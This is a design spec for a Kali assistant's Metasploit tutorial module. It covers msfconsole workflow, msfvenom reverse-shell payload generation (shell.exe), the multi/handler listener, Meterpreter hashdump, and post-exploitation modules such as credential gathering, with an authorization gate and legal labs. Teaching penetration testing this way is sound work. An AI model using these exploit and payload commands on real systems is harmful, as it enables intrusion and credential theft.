# Module 08 — Metasploit Framework (Complete Tool Module)

**Project:** W1CK3D'S KALI ASSIST · **Type:** Tool module (framework/console) · **os_profile: kali**
**Status:** spec v1 · **Companion to:** Blueprint v1.8, nmap template, T03 (PostgreSQL), Modules 02/05/06
**Last updated:** 2026-06-22 · **CLI-focused Top 10: #7**

> The flagship module — **Metasploit** is a full exploitation **framework**, not one command,
> so this is the most extensive tool module in the set. It teaches the **msfconsole grammar**
> (the repeatable workflow that replaces the slot model inside the console) *and* the
> surrounding CLI tools: **msfvenom** (payload generator), **msfdb** (database), and the
> **multi/handler** listener. Built to the project template. **Generate-only** — every
> command is shown and explained; nothing is executed. Exploitation framework ⇒ **strong
> authorization gate**, authorized targets / labs only.

---

## 1. Manifest

```yaml
module_id: tool.metasploit
name: "Metasploit Framework — Exploitation"
version: 1.0.0
type: tool_framework
os_profile: kali
requires: { base_api: ">=1.0" }
recommends: { modules: [tool.nmap, troubleshoot.services, tool.john, tool.hashcat] }
provides:
  tool: metasploit
  binaries: [msfconsole, msfvenom, msfdb]
  flows: [setup_db, search_use, configure_run, auxiliary, sessions_meterpreter,
          post, payloads, msfvenom, handler, workflow_db, maintenance]
  glossary_terms: [framework, module_types, exploit, payload, auxiliary, post, meterpreter,
                   rhosts_lhost, staged_stageless, reverse_bind, session, job, handler,
                   datastore, workspace, msfvenom, msfdb]
content:
  tool: registry/tools/metasploit.yaml
  flows: registry/flows/metasploit_*.yaml
  builder: command_builders/metasploit_builder.py
  glossary: explain/glossary/metasploit.yaml
theme: theme.w1ck3d_systems        # category = Exploitation; offensive → red authz gate
source: "authored; verified against msfconsole/msfvenom help + Rapid7/Offensive Security docs"
license: "project-proprietary lesson text; Metasploit Framework is BSD (referenced, not bundled)"
```

---

## 2. ToolSpec

```yaml
tool_id: metasploit
display_name: "Metasploit Framework"
binary_candidates: [msfconsole, msfvenom]
install_check: "shutil.which('msfconsole')"
categories: [exploitation, post_exploitation]
one_liner: "A framework to find, configure, and launch exploits + manage post-exploitation, against authorized targets."
authorization_gate: true            # OFFENSIVE framework — mandatory consent + legal labs
flows: [setup_db, search_use, configure_run, auxiliary, sessions_meterpreter,
        post, payloads, msfvenom, handler, workflow_db, maintenance]
```

### 2.1 The pieces (taught up front)
- **msfconsole** — the interactive console where you search, configure, and run modules.
- **modules** — the building blocks: **exploit** (breaks in), **payload** (what runs after),
  **auxiliary** (scanners/fuzzers/no-payload tools), **post** (after-access tasks),
  **encoder/nop/evasion** (payload shaping).
- **meterpreter** — the powerful in-memory payload/session you often land in.
- **msfvenom** — standalone payload/shellcode generator (a real CLI tool).
- **msfdb** — sets up the PostgreSQL database the console uses to store hosts/loot.

---

## 3. The msfconsole grammar (the "slot model" for the console)

Inside the console you don't build one bash line — you follow the **same ordered workflow
every time**. This is the console's equivalent of the slot model:

```
  1 SELECT   → search … ; use <module>
  2 INSPECT  → info ; show options ; show payloads ; show targets
  3 CONFIGURE→ set RHOSTS … ; set PAYLOAD … ; set LHOST/LPORT …   (setg = global)
  4 VERIFY   → show options (all required set?) ; check (if supported)
  5 RUN      → run / exploit  (-j background job, -z don't interact)
  6 INTERACT → sessions -i <id> ; meterpreter commands ; background
```

Teach it once, reuse forever — every exploit/auxiliary/post module follows steps 1–5; only
the options differ. The wizard shows **what each command does + which step it is**.

---

## 4. Profiles (the "simple" on-ramp)

| Profile | What it walks | Note shown |
|---------|---------------|------------|
| **Guided exploit** | search → use → set RHOSTS/PAYLOAD/LHOST → check → exploit → session | "The end-to-end path on a lab target." |
| **Scanner (auxiliary)** | use auxiliary/scanner → set RHOSTS → run | "No payload; safe recon/enumeration." |
| **Generate a payload** | msfvenom → file → multi/handler to catch it | "Make + catch a callback." |
| **Post-exploitation** | sessions → use post/… → set SESSION → run | "Work after you have a session." |

All generate/reference only; each command fully explained.

---

## 5. Flows (comprehensive)

Pattern per step: `concept` · `command_detail` · `grammar_step` · `show_command` ·
`success_criteria` · `did_it_work` + `alternatives` · `glossary_refs`.

### Flow A — Setup & database
- **Concept:** Metasploit uses PostgreSQL to store hosts/services/loot (optional but very
  useful).
- **Commands:** `sudo systemctl start postgresql` → `sudo msfdb init` → `msfconsole` →
  inside: `db_status` (expect "connected"). (DB service troubleshooting → T03 §7.)
- **success:** `db_status` shows connected.
- **branches:** *not connected* → start/enable postgresql, re-run `msfdb init` / `msfdb reinit`.
- **glossary:** framework, msfdb, datastore.

### Flow B — Find & select a module
- **Commands:** `search <term>` with filters: `search type:exploit platform:windows name:smb`,
  or `search cve:2017-0144`. Then `use <number>` (from results) or `use <full/module/path>`.
  Inspect: `info`, `show options`, `show payloads`, `show targets`.
- **show:** `search type:exploit name:eternalblue` → `use 0` → `show options`
- **success:** the prompt changes to the module; `show options` lists what to set.
- **branches:** *too many results* → add filters (type/platform/cve/rank); *nothing* →
  broaden terms / check spelling.
- **glossary:** module_types, exploit.

### Flow C — Configure & run an exploit
- **Commands (the datastore):** `set RHOSTS <target>` (and `RPORT` if needed);
  pick a payload `set PAYLOAD <path>`; for reverse payloads set `LHOST <your-ip>` +
  `LPORT <port>`. `setg` sets a value **globally** across modules; `unset` clears one.
  Optionally `check` (some exploits verify exploitability without firing). Then `exploit`
  (alias `run`); `exploit -j` runs as a **background job**, `-z` don't auto-interact.
- **show:** `set RHOSTS 10.0.0.20` → `set PAYLOAD windows/x64/meterpreter/reverse_tcp` →
  `set LHOST 10.0.0.5` → `set LPORT 4444` → `check` → `exploit`
- **success:** "Meterpreter session N opened" (or the exploit's success message).
- **branches (No):**
  - *missing required option* → `show options` shows blanks (often RHOSTS/LHOST).
  - *"Exploit completed, but no session was created"* → wrong target/payload arch, host
    patched, or LHOST/port/firewall wrong → adjust payload/target, confirm reachability
    (nmap, Module 02).
  - *LHOST wrong* → set it to *your* IP on the route to the target.
- **glossary:** rhosts_lhost, payload, job, session.

### Flow D — Auxiliary modules (scanners, no payload)
- **Concept:** `auxiliary/` modules do recon/enumeration/fuzzing without exploiting — a safe
  way to learn the workflow.
- **Commands:** `use auxiliary/scanner/<…>` → `set RHOSTS <range>` → `run`. Results can be
  stored in the DB (`hosts`, `services`).
- **show:** `use auxiliary/scanner/smb/smb_version` → `set RHOSTS 10.0.0.0/24` → `run`
- **glossary:** auxiliary.

### Flow E — Sessions & Meterpreter
- **Commands:** list `sessions -l`; interact `sessions -i <id>`; **background** a session with
  `background` (or Ctrl+Z). In Meterpreter: `help`, `sysinfo`, `getuid`, `ps`, `migrate <pid>`,
  `shell` (drop to OS shell), `download`/`upload`, `hashdump` (then crack with john/hashcat).
- **show:** `sessions -i 1` → `sysinfo` → `getuid` → `hashdump`
- **success:** Meterpreter responds; commands return data.
- **branches:** *session dies* → unstable process → `migrate` to a stable one; *no session* →
  back to Flow C.
- **glossary:** meterpreter, session.

### Flow F — Post-exploitation modules
- **Commands:** with a session open: `use post/<platform>/<…>` → `set SESSION <id>` → `run`
  (e.g., gather creds, enumerate, persistence — authorized engagements only).
- **show:** `use post/windows/gather/hashdump` → `set SESSION 1` → `run`
- **glossary:** post.

### Flow G — Payloads deep-dive (the part people get wrong)
- **Complete layer:**
  - **staged vs stageless:** staged uses `/` (`windows/meterpreter/reverse_tcp`) and sends a
    small stager then the rest; stageless uses `_` (`windows/meterpreter_reverse_tcp`) and is
    one self-contained blob (bigger, more reliable over flaky links).
  - **reverse vs bind:** *reverse* connects back to **your** LHOST/LPORT (works through NAT —
    usual choice); *bind* opens a port **on the target** for you to connect to (needs the
    target reachable, often blocked).
  - list in console: `show payloads` (after `use <exploit>`).
- **glossary:** staged_stageless, reverse_bind.

### Flow H — msfvenom (standalone payload generator — full CLI)
This is a real CLI tool → the **8-slot model applies directly**:

| Slot | msfvenom content | Example |
|------|------------------|---------|
| PROGRAM | `msfvenom` | `msfvenom` |
| GLOBAL/ACTION | payload + shaping | `-p <payload>`, `-e <encoder>`, `-i <iter>`, `-b "\x00"` (badchars), `-a x64`, `--platform windows` |
| TARGET/DATASTORE | payload options | `LHOST=10.0.0.5 LPORT=4444` |
| OUTPUT | format + file | `-f exe` (or `elf`,`raw`,`python`,`war`…), `-o shell.exe` |
| LISTS | discovery | `--list payloads`, `--list formats`, `--list encoders` |

- **show:** `msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.0.0.5 LPORT=4444 -f exe -o shell.exe`
- **honesty note:** encoders (`-e`) are **not reliable AV evasion** anymore — teach what they
  do, but don't oversell them.
- **branches:** *unknown format/payload* → `--list formats` / `--list payloads`.
- **glossary:** msfvenom.

### Flow I — multi/handler (catch the callback)
- **Concept:** after delivering an msfvenom reverse payload, you need a **listener** to catch
  it. That's the handler.
- **Commands:** `use exploit/multi/handler` → `set PAYLOAD <same as msfvenom>` →
  `set LHOST <your-ip>` → `set LPORT <same>` → `exploit -j` (background listener).
- **show:** `use exploit/multi/handler` → `set PAYLOAD windows/x64/meterpreter/reverse_tcp`
  → `set LHOST 10.0.0.5` → `set LPORT 4444` → `exploit -j`
- **branches:** *no callback* → payload's LHOST/LPORT must match the handler exactly; check
  routing/firewall.
- **glossary:** handler, job.

### Flow J — Workflow aids (DB, nmap import, workspaces, resource scripts)
- **Complete layer:** `workspace -a <name>` to isolate engagements; `db_nmap <args>` runs nmap
  and stores results; `db_import <file>` imports an nmap XML; review with `hosts`, `services`,
  `vulns`, `creds`, `loot`. Automate console steps with a **resource script**:
  `resource <file.rc>` (or `makerc <file>` to record your last commands).
- **show:** `db_nmap -sV 10.0.0.0/24` → `hosts` → `services`
- **glossary:** workspace, datastore.

### Flow K — Maintenance / updating (Kali note)
- **Concept:** on Kali, update Metasploit via **apt** (`sudo apt update && sudo apt install
  metasploit-framework`) rather than `msfupdate`. (Package issues → T02.)

---

## 6. Authorization & ethics (mandatory, before any command shown)

> "Metasploit launches real exploits and grants real access. Using it against systems you do
> not own or lack **explicit written permission** to test is a serious crime. Continue only
> for authorized targets." — logged to the audit log.

**Practice legally and effectively:** **Metasploitable 2/3**, your own VMs, **HackTheBox**,
**TryHackMe**, **VulnHub**. The whole module is written around lab targets.

---

## 7. Glossary additions

- **framework / module_types** — Metasploit is a framework of modules: exploit, payload,
  auxiliary, post, encoder, nop, evasion.
- **exploit / payload** — the break-in vs what runs afterward.
- **auxiliary / post** — no-payload tools (scanners) vs after-access tasks.
- **meterpreter** — the in-memory post-exploitation payload/session with rich commands.
- **RHOSTS / LHOST / LPORT** — target(s) / your listener IP / your listener port.
- **staged vs stageless** — `/` (small stager + stage) vs `_` (one self-contained blob).
- **reverse vs bind** — target connects back to you (NAT-friendly) vs you connect to a port
  on the target.
- **session / job** — an active connection to a target / a backgrounded task (`-j`).
- **handler** — the listener (`exploit/multi/handler`) that catches a reverse payload.
- **datastore** — the `set`/`setg` option values for the current module/global.
- **workspace** — a named container in the DB to separate engagements.
- **msfvenom / msfdb** — payload generator / database setup tool.

---

## 8. Design / token mapping

- Category **Exploitation** → tinted tab; **offensive framework → authorization gate is a
  `--status-critical` (red) callout.** Post/exploit "real access" steps reinforce it.
- Console commands and msfvenom lines in `--font-mono`; "did it work?" gate green/red;
  the encoder "not real AV evasion" caveat as `--status-warning`.

---

## 9. Why this is the most complete module

Metasploit is where many learners feel lost, so this module gives them the **one repeatable
grammar** (select → inspect → configure → verify → run → interact) and then layers in every
piece — auxiliary, exploit, payloads (staged/stageless, reverse/bind), meterpreter, post,
msfvenom (full slot mapping), the handler, and the DB/workspace workflow — each with the
real failure branches ("no session created", LHOST mistakes, DB not connected, no callback).
It cross-links to nmap (recon/`db_nmap`), T03 (PostgreSQL), and john/hashcat (cracking
dumped hashes), tying the toolkit together.

*End of Module 08 (Metasploit) spec v1. Next in CLI Top 10: wireshark/tshark.*
